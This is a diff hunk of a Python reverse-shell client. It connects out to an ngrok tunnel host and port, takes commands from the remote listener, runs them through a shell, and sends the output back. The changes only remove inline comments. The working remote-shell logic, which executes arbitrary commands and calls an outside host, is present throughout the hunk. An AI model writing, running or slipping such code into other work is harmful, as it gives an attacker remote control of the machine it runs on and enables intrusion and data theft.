@@ -6,21 +6,21 @@ HOST = '0.tcp.ngrok.io'  # The ip of the listener.
 PORT = 18639  # The same port as listener.
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))  # Connect to listener.
-s.send(str.encode("[*] Connection Established!"))  # Send connection confirmation.
+s.connect((HOST, PORT))  
+s.send(str.encode("[*] Connection Established!")) 
 
-while 1:  # Start loop.
-    data = s.recv(1024).decode("UTF-8")  # Recieve shell command.
+while 1: 
+    data = s.recv(1024).decode("UTF-8")  
     if data == "quit":
-        break  # If it's quit, then break out and close socket.
+        break  
     if data[:2] == "cd":
-        os.chdir(data[3:])  # If it's cd, change directory.
+        os.chdir(data[3:])  
     # Run shell command.
     if len(data) > 0:
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        stdout_value = proc.stdout.read() + proc.stderr.read()  # Read output.
-        output_str = str(stdout_value, "UTF-8")  # Format output.
-        currentWD = os.getcwd() + "> "  # Get current working directory.
-        s.send(str.encode(currentWD + output_str))  # Send output to listener.
+        stdout_value = proc.stdout.read() + proc.stderr.read()  
+        output_str = str(stdout_value, "UTF-8") 
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(currentWD + output_str))
 
 s.close()  # Close socket.
